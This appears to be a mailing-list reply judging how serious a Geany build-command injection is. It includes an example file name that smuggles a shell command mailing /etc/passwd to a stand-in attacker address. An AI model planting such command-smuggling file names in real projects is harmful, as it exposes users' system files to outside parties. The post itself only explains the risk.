Extremely unlikely. The way to get someone to trigger this is to send
a source-file to a developer who then opens it in geany without realizing
that the file is named "mail evil@...kdom.com -s teehee < /etc/passwd".
The "attacked" developer then need to attempt to build it from geany's
internal "build now" button.

A simpler misdeed of similar charactaristics would be to ship a bogus
./configure script that people (who are not developers, mind you)
blindly run and which executes bogus commands on behalf of the logged
in user.

Since the latter isn't really CVE-worthy, I doubt the former even
comes close.

Considering the successes of the wars on alcohol, poverty, drugs and
terror, I think we should give some serious thought to declaring war
on peace.
